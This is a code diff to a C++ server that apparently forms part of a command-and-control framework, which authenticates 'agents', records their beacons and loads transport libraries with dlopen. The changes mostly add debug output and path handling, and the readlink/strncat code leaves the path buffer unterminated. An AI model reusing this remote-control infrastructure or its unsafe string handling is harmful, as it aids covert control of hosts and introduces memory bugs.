@@ -8,7 +8,7 @@
 
 
 #define DEBUG 0
-#define TRANSPORT_DIR "ssh_trans_new"
+#define TRANSPORT_DIR "/ssh_trans_new"
 #define SRV_DELAY 200
 
 #ifdef DEBUG
@@ -194,12 +194,26 @@ int Server::ReloadModules(){
     }
     this->modules->clear();
 
+
+    char result[4096];
+    unsigned long index;
+    struct stat st = {0};
+    
+    // seed RNG
+    srand(time(NULL));
+
+    // gets current file path, so data will be written to correct folder regardless of where execution is called
+	readlink( "/proc/self/cwd", result, 4096);
+    strncat(result, TRANSPORT_DIR, strlen(TRANSPORT_DIR));
+    printf("Process directory: %s\n", result);
+    
+
     // open modules directory 
     // note that we only look in ssh_trans_new for the time being
     // eventually we will progress to where the move to /shared makes sense
     // if ((dir = opendir ("shared/")) != NULL) {
-    if ((dir = opendir (TRANSPORT_DIR)) != NULL) {
-
+    if ((dir = opendir (result)) != NULL) {
+        int count = 0;
         // loop over each module
         while ((ent = readdir (dir)) != NULL) {
 
@@ -208,16 +222,18 @@ int Server::ReloadModules(){
                 #ifdef DEBUG
                 log(LOG_INFO, "Ignoring non-library file \"%s\"", ent->d_name);
                 #endif
+                printf("Nonlib %s\n", ent->d_name);
                 continue;
             } else {
 
                 // get module path
                 memset(buff, 0, 2048);
-                sprintf(buff, "./%s/%s", TRANSPORT_DIR, ent->d_name);
+                sprintf(buff, "%s/%s", result, ent->d_name);
                 
                 // open the module and handle the instance
                 void *handle = dlopen(buff, RTLD_NOW);
                 if(!handle) {
+                    printf("Failed to load .so file: %s\n", dlerror());
                     log(LOG_ERROR, "Failed to load .so file: %s", dlerror());    
                     continue;
                 }
@@ -226,13 +242,22 @@ int Server::ReloadModules(){
 
                 AddModule(handle);
             }
+            count++;
         }
+        
+        // sanity check to make sure we actually loaded a transport
+        if(count == 0){
+            printf("[FATAL]\tNo transports found! Bailing...\n");
+            exit(1);
+        }
+
     } else {
         // Failed to open directory 
         this->log(LOG_FATAL, "[Loader] Failed to open target directory 'shared/'");
         perror("");
         exit(2);
     }
+    printf("Loading complete\n");
 
     // close handle and return
     closedir (dir);
@@ -466,9 +491,12 @@ int Server::HandleTask(ptask_t task){
     
     // write beacon data for agent
     case TASK_PUSH_BEACON:
-        log(LOG_INFO, "Caught beacon write request");
-        printf("Caught beacon..\n");
-        Common::write_agent_beacon(task->data);
+        {
+            log(LOG_INFO, "Caught beacon write request");
+            printf("Caught beacon..\n");
+            int success = Common::write_agent_beacon(task->data);
+            printf("Success status: %d\n", success);
+        }
         break;
 
     // unknown/NOP request
@@ -523,7 +551,7 @@ int Server::Authenticate(pauth_t auth){
     
     if(size == 0){
         log(LOG_ERROR, "Found default agent file. Register agents by compiling them with this install");
-        return RESP_AUTH_FAIL;
+        return RESP_FAIL;
     }
 
     tokens = Common::str_split(buff, '\n');
@@ -556,14 +584,14 @@ int Server::Authenticate(pauth_t auth){
                     }
                     free(subtokens);
                     free(tokens);
-                    return RESP_AUTH_OK;
+                    return RESP_OK;
                 }
                 else {
                     free(auth_pass);
                     // note here that we do not break the loop, 
                     //t o prevent brute forcing of IDs through response time correlation
                     log(LOG_WARN, "ID %s failed to pass password authentication\n", auth->uname);
-                    return RESP_AUTH_FAIL;
+                    return RESP_FAIL;
                 }
             }
         }
@@ -583,29 +611,35 @@ int Server::Authenticate(pauth_t auth){
     free(subtokens);
     free(tokens);
 
-    return RESP_AUTH_FAIL;
+    return RESP_FAIL;
 }
 
 
 // the main logical loop of the server
 int Server::MainLoop(){
 
-    /*
-    UNIMPLEMENTED
-    */
 
-   GenerateInstance(modules->back());
+    printf("test\n");
+    if (this->modules == nullptr) {
+        printf("rip\n");
+        exit(1);
+    }
 
-   ptask_t tmp = (ptask_t)malloc(sizeof(task_t));
-   tmp->to = 0;
-   tmp->from = 0;
-   tmp->type = TASK_NULL;
-   tmp->length = 0;
-   tmp->data = nullptr;
+    printf("Address of module: %p\n", modules);
+    
+    GenerateInstance(modules->back());
 
-   PushTask(tmp);
+    ptask_t tmp = (ptask_t)malloc(sizeof(task_t));
+    tmp->to = 0;
+    tmp->from = 0;
+    tmp->type = TASK_NULL;
+    tmp->length = 0;
+    tmp->data = nullptr;
 
-   while(1){
+    PushTask(tmp);
+
+    while(1){
+        printf("[SERVER] MAIN LOOP EXECUTION\n");
         // print all accumulated logs
         WriteLogs();
 
@@ -616,7 +650,7 @@ int Server::MainLoop(){
         HandleTaskings();
 
         std::this_thread::sleep_for(std::chrono::milliseconds(SRV_DELAY));
-   }
+    }
 
 
     return 0;
